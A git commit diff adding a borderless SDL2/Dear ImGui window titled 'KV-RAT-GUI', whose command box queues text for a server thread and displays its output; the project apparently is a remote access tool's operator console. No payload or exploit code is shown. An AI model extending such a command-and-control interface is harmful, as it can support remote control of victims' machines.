0a1f384cd8e38e0e232affbaa6530d20ea42cd4d
Toby Dodge <tobydodge65@gmail.com>
2023-09-06 23:46:36 -0230

    Added some imgui stuff

--- main.cpp
+++ main.cpp
@@ -248,6 +248,8 @@ void server(std::string& sharedOutput)
 
 int SDL_IMGUI_GUI(std::string& sharedOutput)
 {
+    ShowScreenshotScreen();
+
     if(SDL_Init(SDL_INIT_VIDEO | SDL_INIT_TIMER| SDL_INIT_GAMECONTROLLER) != 0)
     {
         std::cerr << "Error" << SDL_GetError();
@@ -264,9 +266,10 @@ int SDL_IMGUI_GUI(std::string& sharedOutput)
     SDL_GL_SetAttribute(SDL_GL_DOUBLEBUFFER, 1);
     SDL_GL_SetAttribute(SDL_GL_DEPTH_SIZE, 24);
     SDL_GL_SetAttribute(SDL_GL_STENCIL_SIZE, 8);
-    SDL_WindowFlags window_flags = (SDL_WindowFlags)(SDL_WINDOW_OPENGL | SDL_WINDOW_RESIZABLE | SDL_WINDOW_ALLOW_HIGHDPI);
+    SDL_WindowFlags window_flags = (SDL_WindowFlags)(SDL_WINDOW_OPENGL | SDL_WINDOW_RESIZABLE | SDL_WINDOW_ALLOW_HIGHDPI | SDL_WINDOW_SHOWN);
     SDL_Window* window = SDL_CreateWindow("Dear ImGui SDL2+OpenGL3 example", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, 1280, 720, window_flags);
     SDL_GLContext gl_context = SDL_GL_CreateContext(window);
+    SDL_SetWindowBordered(window, SDL_FALSE);
     SDL_GL_MakeCurrent(window, gl_context);
     SDL_GL_SetSwapInterval(1); // Enable vsync
 
@@ -312,7 +315,7 @@ int SDL_IMGUI_GUI(std::string& sharedOutput)
             static int counter = 0;
 
             ImGui::Begin("KV-RAT-GUI", NULL);
-            ImGui::SetWindowSize(ImVec2(100, 1500));
+            ImGui::SetWindowSize(ImVec2(1280,720));
 
             std::string inputCommand;
             if (ImGui::InputText("Command", &inputCommand, ImGuiInputTextFlags_EnterReturnsTrue))
@@ -355,9 +358,93 @@ int SDL_IMGUI_GUI(std::string& sharedOutput)
     SDL_Quit();
 }
 
+int SDL_IMGUI_GUI_AHHH(std::string& sharedOutput)
+{
+    ShowScreenshotScreen();
+
+    if (SDL_Init(SDL_INIT_VIDEO | SDL_INIT_TIMER | SDL_INIT_GAMECONTROLLER) != 0) {
+        std::cerr << "Error: " << SDL_GetError();
+        return -1;
+    }
+
+    // Initialize OpenGL context
+    SDL_GL_SetAttribute(SDL_GL_CONTEXT_FLAGS, 0);
+    SDL_GL_SetAttribute(SDL_GL_CONTEXT_PROFILE_MASK, SDL_GL_CONTEXT_PROFILE_CORE);
+    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MAJOR_VERSION, 3);
+    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MINOR_VERSION, 0);
+    SDL_GL_SetAttribute(SDL_GL_DOUBLEBUFFER, 1);
+    SDL_GL_SetAttribute(SDL_GL_DEPTH_SIZE, 24);
+    SDL_GL_SetAttribute(SDL_GL_STENCIL_SIZE, 8);
+
+    // Create window and OpenGL context
+    SDL_Window* window = SDL_CreateWindow("Dear ImGui SDL2+OpenGL3 example", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, 1280, 720, SDL_WINDOW_OPENGL | SDL_WINDOW_RESIZABLE | SDL_WINDOW_ALLOW_HIGHDPI | SDL_WINDOW_SHOWN);
+    SDL_GLContext gl_context = SDL_GL_CreateContext(window);
+    SDL_GL_MakeCurrent(window, gl_context);
+    SDL_GL_SetSwapInterval(1); // Enable vsync
+
+    // Initialize ImGui
+    IMGUI_CHECKVERSION();
+    ImGui::CreateContext();
+    ImGuiIO& io = ImGui::GetIO();
+    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard | ImGuiConfigFlags_NavEnableGamepad;
+    ImGui::StyleColorsDark();
+    ImGui_ImplSDL2_InitForOpenGL(window, gl_context);
+    ImGui_ImplOpenGL3_Init("#version 130");
+    ImVec4 clear_color = ImVec4(0.45f, 0.55f, 0.60f, 1.00f);
+
+    // Main loop
+    bool done = false;
+    while (!done) {
+        SDL_Event event;
+        while (SDL_PollEvent(&event)) {
+            ImGui_ImplSDL2_ProcessEvent(&event);
+            if (event.type == SDL_QUIT || (event.type == SDL_WINDOWEVENT && event.window.event == SDL_WINDOWEVENT_CLOSE && event.window.windowID == SDL_GetWindowID(window))) {
+                done = true;
+            }
+        }
+
+        int winWidth, winHeight;
+        SDL_GetWindowSize(window, &winWidth, &winHeight);
+
+        ImGui_ImplOpenGL3_NewFrame();
+        ImGui_ImplSDL2_NewFrame();
+        ImGui::NewFrame();
+        
+        ImGui::SetNextWindowPos(ImVec2(0,0));
+        ImGui::SetWindowSize(ImVec2(winWidth, winHeight));
+        ImGui::Begin("KV-RAT-GUI", nullptr, ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoMove);
+        
+        std::string inputCommand;
+        if (ImGui::InputText("Command", &inputCommand, ImGuiInputTextFlags_EnterReturnsTrue)) {
+            std::lock_guard<std::mutex> lock(queueMutex);
+            commandQueue.push(inputCommand);
+            dataCond.notify_one();
+        }
+        ImGui::Text("%s", sharedOutput.c_str());
+        ImGui::End();
+
+        ImGui::Render();
+        glViewport(0, 0, (int)io.DisplaySize.x, (int)io.DisplaySize.y);
+        glClearColor(clear_color.x, clear_color.y, clear_color.z, clear_color.w);
+        glClear(GL_COLOR_BUFFER_BIT);
+        ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());
+        SDL_GL_SwapWindow(window);
+    }
+
+    // Cleanup
+    ImGui_ImplOpenGL3_Shutdown();
+    ImGui_ImplSDL2_Shutdown();
+    ImGui::DestroyContext();
+    SDL_GL_DeleteContext(gl_context);
+    SDL_DestroyWindow(window);
+    SDL_Quit();
+
+    return 0;
+}
+
 void sdl_thread(std::string& sharedOutput)
 {
-    SDL_IMGUI_GUI(sharedOutput);
+    SDL_IMGUI_GUI_AHHH(sharedOutput);
 }
 
 void server_thread(std::string& sharedOutput)
